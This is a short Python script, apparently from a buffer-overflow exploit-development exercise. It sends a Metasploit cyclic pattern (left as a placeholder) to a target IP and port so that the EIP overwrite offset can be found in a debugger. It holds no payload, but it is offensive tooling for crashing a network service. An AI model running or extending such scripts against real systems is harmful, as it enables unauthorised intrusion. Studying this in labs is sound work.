import socket
from struct import pack

IP = "192.168.1.2" #altere para o ip da maquina local ou alvo
port = 21449 #altere para a porta que roda no programa 

def eip_offset():
    #crie o offset com o mesmo valor do estouro da etapa anterior
    #comando: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <valor do estouro> > pattern.txt
    pattern = bytes("insira aqui a lista criada", "utf-8")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(pattern)
    s.close()

eip_offset()
#após rodar novamente o script verifique o endereço retornado no xdbg
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <endereço obitido>
